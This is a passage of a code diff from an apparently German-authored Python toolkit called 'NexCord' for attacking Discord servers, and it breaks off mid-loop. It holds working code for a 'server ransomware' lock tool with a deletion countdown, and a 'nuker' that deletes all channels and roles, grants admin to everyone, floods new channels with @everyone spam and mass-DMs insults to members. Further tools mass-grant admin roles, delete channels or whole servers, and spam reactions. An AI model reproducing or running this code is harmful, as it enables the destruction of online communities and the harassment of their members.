-    SERVER_ID = int(input(WHITE + "Enter the Server ID to log: " + RESET).strip())
-
-    intents = discord.Intents.all()
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    @bot.event
-    async def on_ready():
-        guild = bot.get_guild(SERVER_ID)
-        if not guild:
-            log_event("Bot is not in the server with this ID!")
-            return
-        log_event(f"{bot.user} is online and logging server: {guild.name}")
-
-    # Messages
-    @bot.event
-    async def on_message(message):
-        if message.author.bot or message.guild.id != SERVER_ID:
-            return
-        log_event(f"Message from {message.author} ({message.author.id}): {message.content}")
-
-    # Deleted Messages
-    @bot.event
-    async def on_message_delete(message):
-        if message.guild.id != SERVER_ID:
-            return
-        content = message.content or "[Attachment or embed]"
-        log_event(f"Message Deleted from {message.author} ({message.author.id}): {content}")
-
-    # Member Join / Leave
-    @bot.event
-    async def on_member_join(member):
-        if member.guild.id != SERVER_ID:
-            return
-        log_event(f"Member Joined: {member} ({member.id})")
-
-    @bot.event
-    async def on_member_remove(member):
-        if member.guild.id != SERVER_ID:
-            return
-        log_event(f"Member Left: {member} ({member.id})")
-
-    # Bans / Unbans
-    @bot.event
-    async def on_member_ban(guild, user):
-        if guild.id != SERVER_ID:
-            return
-        log_event(f"Member Banned: {user} ({user.id})")
-
-    @bot.event
-    async def on_member_unban(guild, user):
-        if guild.id != SERVER_ID:
-            return
-        log_event(f"Member Unbanned: {user} ({user.id})")
-
-    # Channel Events
-    @bot.event
-    async def on_guild_channel_create(channel):
-        if channel.guild.id != SERVER_ID:
-            return
-        log_event(f"Channel Created: {channel.name} | Type: {channel.type}")
-
-    @bot.event
-    async def on_guild_channel_delete(channel):
-        if channel.guild.id != SERVER_ID:
-            return
-        log_event(f"Channel Deleted: {channel.name} | Type: {channel.type}")
-
-    @bot.event
-    async def on_guild_channel_update(before, after):
-        if after.guild.id != SERVER_ID:
-            return
-        log_event(f"Channel Updated: {before.name} → {after.name} | Type: {after.type}")
-
-    # Server / Guild Updates
-    @bot.event
-    async def on_guild_update(before, after):
-        if after.id != SERVER_ID:
-            return
-        changes = []
-        if before.name != after.name:
-            changes.append(f"Name: {before.name} → {after.name}")
-        if before.icon != after.icon:
-            changes.append("Server Icon Changed")
-        log_event(f"Server Updated: {' | '.join(changes) if changes else 'Unknown Change'}")
-
-    # Voice State Updates
-    @bot.event
-    async def on_voice_state_update(member, before, after):
-        if member.guild.id != SERVER_ID:
-            return
-        if before.channel != after.channel:
-            if after.channel is None:
-                log_event(f"Voice Leave: {member} left {before.channel}")
-            elif before.channel is None:
-                log_event(f"Voice Join: {member} joined {after.channel}")
-            else:
-                log_event(f"Voice Move: {member} moved from {before.channel} → {after.channel}")
-
-    bot.run(TOKEN)
-
-def server_lock_tool():
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + "[ Server Ransomeware & Server Lock Tool ]\n" + RESET)
-    
-    # WARNUNG anzeigen
-    print(WHITE + "⚠️  WARNING: THIS IS ALL FAKE! THE SERVER CAN NEVER BE RESTORED AGAIN! ⚠️" + RESET)
-    
-    TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
-    GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
-    
-    # Benutzerdefinierte Nachricht
-    custom_message = input(WHITE + "Enter custom ransomeware message and link (press Enter for default): " + RESET).strip()
-    if not custom_message:
-        custom_message = "🔒 **This server has been locked by NexCord HAHAHAHA** 🔒"
-    
-    # Timer für Server-Löschung in Sekunden
-    delete_timer = input(WHITE + "Enter server deletion timer in SECONDS (0 for no deletion): " + RESET).strip()
-    try:
-        delete_timer = int(delete_timer)
-    except ValueError:
-        delete_timer = 0
-    
-    # Bestätigung mit neuem Text
-    confirm = input(WHITE + "⚠️ WARNING: This will delete ALL channels and categories! Type 'LOCK THAT SHIT' to confirm: " + RESET).strip()
-    if confirm.upper() != "LOCK THAT SHIT":
-        print(WHITE + "Operation cancelled." + RESET)
-        input(WHITE + "Press [Enter] to return to main menu..." + RESET)
-        return
-
-    intents = discord.Intents.default()
-    intents.guilds = True
-    intents.members = True
-    bot = commands.Bot(command_prefix="!", intents=intents)
-
-    # Globale Variablen für den Countdown
-    countdown_task = None
-    text_channel = None
-
-    async def update_countdown(seconds_left):
-        """Aktualisiert den Countdown im Channel"""
-        try:
-            if text_channel:
-                # Lösche alle vorherigen Countdown-Nachrichten
-                async for message in text_channel.history(limit=10):
-                    if "⏰ **Time until deletion:" in message.content:
-                        await message.delete()
-                
-                # Sende neuen Countdown
-                if seconds_left > 0:
-                    mins, secs = divmod(seconds_left, 60)
-                    countdown_msg = f"⏰ **Time until deletion:** {mins:02d}:{secs:02d}"
-                    await text_channel.send(countdown_msg)
-        except:
-            pass
-
-    @bot.event
-    async def on_ready():
-        print(WHITE + f"Bot is ready as {bot.user}" + RESET)
-        guild = bot.get_guild(GUILD_ID)
-        if not guild:
-            print(WHITE + "Server not found!" + RESET)
-            await bot.close()
-            return
-
-        try:
-            # Server umbenennen
-            await guild.edit(name="𝓛𝓸𝓬𝓴𝓮𝓭 𝓫𝔂 𝓷𝓮𝔁𝓬𝓸𝓻𝓭")
-            print(WHITE + "Server name changed to: 𝓛𝓸𝓬𝓴𝓮𝓭 𝓫𝔂 𝓷𝓮𝔁𝓬𝓸𝓻𝓭" + RESET)
-            
-            # Alle Rollen löschen die gelöscht werden können
-            print(WHITE + "Deleting all deletable roles..." + RESET)
-            for role in guild.roles:
-                try:
-                    if role.name != "@everyone" and role < guild.me.top_role and not role.managed:
-                        await role.delete()
-                        print(WHITE + f"Deleted role: {role.name}" + RESET)
-                        await asyncio.sleep(0.5)
-                except Exception as e:
-                    print(WHITE + f"Failed to delete role {role.name}: {e}" + RESET)
-            
-            # Daddy NexCord Rolle erstellen (rot mit Admin)
-            try:
-                daddy_role = await guild.create_role(
-                    name="𝓓𝓐𝓓𝓓𝓨 𝓝𝓔𝓧𝓒𝓞𝓡𝓓",
-                    permissions=discord.Permissions(administrator=True),
-                    colour=discord.Colour.red()
-                )
-                # Rolle an oberste Position setzen
-                await daddy_role.edit(position=len(guild.roles)-1)
-                print(WHITE + "Created admin role: 𝓓𝓐𝓓𝓓𝓨 𝓝𝓔𝓧𝓒𝓞𝓡𝓓" + RESET)
-                
-                # Rolle jedem Member geben
-                for member in guild.members:
-                    try:
-                        await member.add_roles(daddy_role)
-                        print(WHITE + f"Added role to: {member}" + RESET)
-                    except:
-                        continue
-            except Exception as e:
-                print(WHITE + f"Failed to create admin role: {e}" + RESET)
-            
-            # Alle Channels und Kategorien löschen
-            print(WHITE + "Deleting all channels and categories..." + RESET)
-            for channel in list(guild.channels):
-                try:
-                    await channel.delete()
-                    print(WHITE + f"Deleted: {channel.name}" + RESET)
-                    await asyncio.sleep(0.5)
-                except Exception as e:
-                    print(WHITE + f"Failed to delete {channel.name}: {e}" + RESET)
-            
-            # Neue Kategorie erstellen
-            overwrites = {
-                guild.default_role: discord.PermissionOverwrite(
-                    read_messages=True,
-                    send_messages=False,
-                    add_reactions=False,
-                    connect=False,
-                    speak=False
-                ),
-                guild.me: discord.PermissionOverwrite(
-                    read_messages=True,
-                    send_messages=True,
-                    manage_messages=True,
-                    manage_channels=True
-                )
-            }
-            
-            category = await guild.create_category("Locked by nexcord", overwrites=overwrites)
-            print(WHITE + "Created category: Locked by nexcord" + RESET)
-            
-            # Text-Channel in der Kategorie erstellen
-            nonlocal text_channel
-            text_channel = await guild.create_text_channel(
-                "decrypt-server", 
-                category=category,
-                overwrites=overwrites
-            )
-            print(WHITE + "Created channel: decrypt-server" + RESET)
-            
-            # Nachricht zusammenbauen
-            message_content = custom_message
-            
-            if delete_timer > 0:
-                deletion_time = datetime.now() + timedelta(seconds=delete_timer)
-                message_content += " "
-            
-            # Nachricht im Channel posten
-            lock_message = await text_channel.send(message_content)
-            await lock_message.pin()
-            print(WHITE + "Posted lock message and pinned it" + RESET)
-            
-            # Server-Löschungs-Timer starten falls aktiviert
-            if delete_timer > 0:
-                print(WHITE + f"Server deletion timer set for {delete_timer} seconds" + RESET)
-                # Starte den Lösch-Timer mit Countdown
-                nonlocal countdown_task
-                countdown_task = asyncio.create_task(delete_server_with_countdown(guild, delete_timer))
-            
-            print(WHITE + "\n✅ Server lock completed successfully!" + RESET)
-            
-            # Bot online lassen bis alle Tasks fertig sind
-            if delete_timer > 0:
-                await countdown_task
-            else:
-                # Wenn kein Timer, trotzdem 10 Sekunden warten
-                await asyncio.sleep(10)
-            
-        except Exception as e:
-            print(WHITE + f"Error during server lock: {e}" + RESET)
-        
-        finally:
-            # Bot beenden nach Abschluss aller Tasks
-            await bot.close()
-
-    async def delete_server_with_countdown(guild, seconds):
-        """dlt"""
-        try:
-            print(WHITE + f"Starting {seconds} second countdown..." + RESET)
-            
-            # Countdown anzeigen
-            for i in range(seconds, 0, -1):
-                await update_countdown(i)
-                await asyncio.sleep(1)
-            
-            print(WHITE + "Countdown finished. Starting final server deletion..." + RESET)
-            
-            # Finale Löschung durchführen
-            await final_server_deletion(guild)
-            
-        except Exception as e:
-            print(WHITE + f"Error during countdown: {e}" + RESET)
-
-    async def final_server_deletion(guild):
-        """Führt die finale Server-Löschung durch"""
-        try:
-            print(WHITE + "Performing final server deletion..." + RESET)
-            
-            # Server umbenennen zu "deleted by daddy nexcord"
-            await guild.edit(name="𝓭𝓮𝓵𝓮𝓽𝓮𝓭 𝓫𝔂 𝓭𝓪𝓭𝓭𝔂 𝓷𝓮𝔁𝓬𝓸𝓻𝓭")
-            print(WHITE + "Server name changed to: 𝓭𝓮𝓵𝓮𝓽𝓮𝓭 𝓫𝔂 𝓭𝓪𝓭𝓭𝔂 𝓷𝓮𝔁𝓬𝓸𝓻𝓭" + RESET)
-            
-            # Nochmal alle Channels löschen (falls neue erstellt wurden)
-            for channel in list(guild.channels):
-                try:
-                    await channel.delete()
-                    print(WHITE + f"Final deletion: {channel.name}" + RESET)
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
-            
-            # Alle Rollen löschen (außer @everyone und managed roles)
-            for role in guild.roles:
-                try:
-                    if role.name != "@everyone" and not role.managed:
-                        await role.delete()
-                        print(WHITE + f"Final deletion role: {role.name}" + RESET)
-                        await asyncio.sleep(0.3)
-                except:
-                    pass
-            
-            print(WHITE + f"Server {guild.name} has been completely nuked." + RESET)
-            
-            # Finale Nachricht vor dem Beenden
-            await asyncio.sleep(2)
-            
-        except Exception as e:
-            print(WHITE + f"Failed to complete final server nuke: {e}" + RESET)
-
-    # Bot starten und laufen lassen
-    try:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         loop.run_until_complete(bot.start(TOKEN))
+        
     except KeyboardInterrupt:
-        print(WHITE + "\nBot stopped by user" + RESET)
+        print(RED + "\nOperation cancelled by user!" + RESET)
     except Exception as e:
-        print(WHITE + f"Error: {e}" + RESET)
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
 
-def placeholder_tool(name):
-    clear()
-    print(PINK + BANNER + RESET)
-    print(WHITE + f"[ {name} ]" + RESET)
+def reaction_spammer_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Reaction Spammer - Auto Multi-Emoji ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        DELAY = float(input(WHITE + "Delay between reactions in seconds (e.g., 0.5): " + RESET))
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+
+        standard_emojis = [
+            "😀","😃","😄","😁","😆","😅","😂","🤣","😊","😇","🙂","🙃","😉","😌","😍",
+            "🥰","😘","😗","😙","😚","😋","😛","😝","😜","🤪","🤨","🧐","🤓","😎","🥳",
+            "🤩","🥺","😏","😒","😞","😔","😟","😕","🙁","☹️","😣","😖","😫","😩","🥱",
+            "😤","😠","😡","🤬","😶","😐","😑","😯","😦","😧","😮","😲","🥵","🥶","😱",
+            "😨","😰","😥","😓","🤗","🤔","🤭","🤫","🤥","😶‍🌫️","😐","😑","😬","🙄","😯"
+        ]
+
+        intents = discord.Intents.default()
+        intents.messages = True
+        intents.guilds = True
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+                    
+                async def react_channel(channel):
+                    try:
+                        async for message in channel.history(limit=None):
+                            if should_exit:
+                                return
+                            emojis_to_use = random.sample(standard_emojis, k=16)
+                            for emoji in emojis_to_use:
+                                if should_exit:
+                                    return
+                                try:
+                                    await message.add_reaction(emoji)
+                                    if not should_exit:
+                                        await asyncio.sleep(DELAY)
+                                except:
+                                    continue
+                    except:
+                        pass
+                        
+                tasks = [react_channel(channel) for channel in guild.text_channels]
+                await asyncio.gather(*tasks)
+                
+                if not should_exit:
+                    print(WHITE + "Finished reacting to all messages." + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def nickname_changer_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Nickname Changer ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                while True:
+                    if should_exit:
+                        print(RED + "Operation cancelled!" + RESET)
+                        break
+                        
+                    USER_ID = int(input(WHITE + "Enter user ID to change nickname: " + RESET))
+                    NEW_NICK = input(WHITE + "Enter new nickname: " + RESET)
+                    member = guild.get_member(USER_ID)
+                    if not member:
+                        print(RED + "User not found!" + RESET)
+                    else:
+                        try:
+                            await member.edit(nick=NEW_NICK)
+                            print(WHITE + f"Nickname of {member} changed to {NEW_NICK}" + RESET)
+                        except:
+                            print(RED + "Failed to change nickname!" + RESET)
+                    choice = input(WHITE + "Type 1 to continue changing nicknames or B to return to main menu: " + RESET).strip()
+                    if choice.upper() == "B":
+                        await bot.close()
+                        break
+            except KeyboardInterrupt:
+                print(RED + "\nOperation cancelled by user!" + RESET)
+                await bot.close()
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def admin_user_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Admin User ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        USER_ID = int(input(WHITE + "Enter user ID to give admin: " + RESET))
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                member = guild.get_member(USER_ID)
+                if not member:
+                    print(RED + "User not found!" + RESET)
+                else:
+                    try:
+                        role = await guild.create_role(name="NexCordKing", permissions=discord.Permissions(administrator=True))
+                        await member.add_roles(role)
+                        await role.edit(position=guild.me.top_role.position - 1)
+                        print(WHITE + f"Admin role given to {member}" + RESET)
+                    except:
+                        print(RED + "Failed to give admin!" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def admin_all_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Admin All ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                try:
+                    role = await guild.create_role(name="NexCordKing", permissions=discord.Permissions(administrator=True))
+                    await role.edit(position=guild.me.top_role.position - 1)
+                    for member in guild.members:
+                        if should_exit:
+                            break
+                        await member.add_roles(role)
+                    if not should_exit:
+                        print(WHITE + "Admin role given to everyone!" + RESET)
+                except:
+                    print(RED + "Failed to give admin to all!" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def role_giver_user_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Role Giver (User) ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        USER_ID = int(input(WHITE + "Enter user ID: " + RESET))
+        ROLE_INPUT = input(WHITE + "Enter Role ID or Role Name: " + RESET).strip()
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                member = guild.get_member(USER_ID)
+                role = None
+                for r in guild.roles:
+                    if str(r.id) == ROLE_INPUT or r.name == ROLE_INPUT:
+                        role = r
+                        break
+                if not member:
+                    print(RED + "User not found!" + RESET)
+                elif not role:
+                    print(RED + "Role not found!" + RESET)
+                else:
+                    try:
+                        await member.add_roles(role)
+                        print(WHITE + f"Role {role.name} given to {member}" + RESET)
+                    except:
+                        print(RED + "Failed to give role!" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def role_giver_everybody_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Role Giver (Everybody) ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        ROLE_INPUT = input(WHITE + "Enter Role ID or Role Name: " + RESET).strip()
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                role = None
+                for r in guild.roles:
+                    if str(r.id) == ROLE_INPUT or r.name == ROLE_INPUT:
+                        role = r
+                        break
+                if not role:
+                    print(RED + "Role not found!" + RESET)
+                else:
+                    for member in guild.members:
+                        if should_exit:
+                            break
+                        try:
+                            await member.add_roles(role)
+                        except:
+                            continue
+                    if not should_exit:
+                        print(WHITE + f"Role {role.name} given to everyone!" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def channel_deleter_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Channel Deleter (Single) ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        CHANNEL_ID = int(input(WHITE + "Enter channel ID to delete: " + RESET))
+        CONFIRM = input(WHITE + "Are you sure? Type YES to confirm: " + RESET).strip()
+        if CONFIRM.upper() != "YES":
+            print(RED + "Cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                channel = guild.get_channel(CHANNEL_ID)
+                if not channel:
+                    print(RED + "Channel not found!" + RESET)
+                else:
+                    try:
+                        await channel.delete()
+                        print(WHITE + f"Channel {channel.name} deleted!" + RESET)
+                    except:
+                        print(RED + "Failed to delete channel!" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def channel_deleter_all_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Channel Deleter (All) ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        CONFIRM = input(WHITE + "Use at your own risk! Type YES to confirm deletion of ALL channels: " + RESET).strip()
+        if CONFIRM.upper() != "YES":
+            print(RED + "Cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                for channel in guild.channels:
+                    if should_exit:
+                        break
+                    try:
+                        await channel.delete()
+                    except:
+                        continue
+                if not should_exit:
+                    print(WHITE + "All channels deleted!" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def server_deleter_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Server Deleter ]\n" + RESET)
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        CONFIRM = input(WHITE + "WARNING! This will delete everything on the server. Type YES to confirm: " + RESET).strip()
+        if CONFIRM.upper() != "YES":
+            print(RED + "Cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+
+                for channel in guild.channels:
+                    if should_exit:
+                        break
+                    try:
+                        await channel.delete()
+                    except:
+                        continue
+
+                for role in guild.roles:
+                    if should_exit:
+                        break
+                    try:
+                        if role < guild.me.top_role:
+                            await role.delete()
+                    except:
+                        continue
+
+                try:
+                    await guild.edit(
+                        name="Deleted by NexCord",
+                        description="NEXCORD ON TOP",
+                        icon=await (await bot.http_session.get("https://i0.wp.com/digitalhealthskills.com/wp-content/uploads/2022/11/3da39-no-user-image-icon-27.png?fit=500%2C500&ssl=1")).read()
+                    )
+                except:
+                    print(RED + "Failed to edit server info or icon!" + RESET)
+
+                if not should_exit:
+                    print(WHITE + "Server deletion completed!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def nuker_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Nuke Tool - ultra fast + continuous spam ]\n" + RESET)
+
+        TOKEN = input(WHITE + "Enter your bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter your test server ID: " + RESET))
+
+        confirm = input(WHITE + "WARNING: This will delete ALL channels and roles on the server! Type yes to continue: " + RESET).strip()
+        if confirm.lower() != "yes":
+            print(RED + "Cancelled." + RESET)
+            return_to_menu()
+            return
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.members = True
+        intents.messages = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Server not found!" + RESET)
+                    await bot.close()
+                    return
+
+                try:
+                    await guild.edit(name="NexCord On Top")
+                    print(WHITE + f"Server name changed to: {guild.name}" + RESET)
+                except Exception as e:
+                    print(RED + f"Failed to change server name: {e}" + RESET)
+
+                print(WHITE + "Deleting all channels..." + RESET)
+                delete_channel_tasks = [channel.delete() for channel in guild.channels]
+                await asyncio.gather(*delete_channel_tasks, return_exceptions=True)
+
+                print(WHITE + "Deleting all deletable roles..." + RESET)
+                delete_role_tasks = [role.delete() for role in guild.roles if role < guild.me.top_role and not role.managed]
+                await asyncio.gather(*delete_role_tasks, return_exceptions=True)
+
+                try:
+                    admin_role = await guild.create_role(
+                        name="NEXCORD NUKE",
+                        permissions=discord.Permissions(administrator=True),
+                        colour=discord.Colour.red()
+                    )
+                    print(WHITE + f"Created role: {admin_role.name}" + RESET)
+                except Exception as e:
+                    print(RED + f"Failed to create admin role: {e}" + RESET)
+                    admin_role = None
+
+                if admin_role:
+                    for member in guild.members:
+                        if should_exit:
+                            break
+                        try:
+                            await member.add_roles(admin_role, atomic=False)
+                        except:
+                            continue
+
+                print(WHITE + "Creating 20 new channels..." + RESET)
+                create_tasks = [guild.create_text_channel(f"NexCord On Top-{i+1}") for i in range(20)]
+                new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+
+                for ch in new_channels:
+                    if isinstance(ch, Exception):
+                        print(RED + f"Error creating a channel: {ch}" + RESET)
+                    else:
+                        print(WHITE + f"Created: {ch.name}" + RESET)
+
+                async def spam_channel(channel):
+                    while True:
+                        if should_exit:
+                            break
+                        try:
+                            await channel.send("@everyone NUKED BY NEXCORD")
+                            await channel.send("@everyone GET FUCKING NUKED BY NEXCORD")
+                            await asyncio.sleep(2)
+                        except Exception as e:
+                            print(RED + f"Error sending messages in {channel.name}: {e}" + RESET)
+                            break
+
+                for ch in new_channels:
+                    if not isinstance(ch, Exception):
+                        asyncio.create_task(spam_channel(ch))
+
+                async def dm_members():
+                    while True:
+                        if should_exit:
+                            break
+                        for member in guild.members:
+                            if should_exit:
+                                break
+                            try:
+                                await member.send("Hey you fucker, one of the servers you were in just got nuked by Nexcord. Hope you like it!")
+                            except:
+                                continue
+                        await asyncio.sleep(2)
+
+                asyncio.create_task(dm_members())
+
+                while not should_exit:
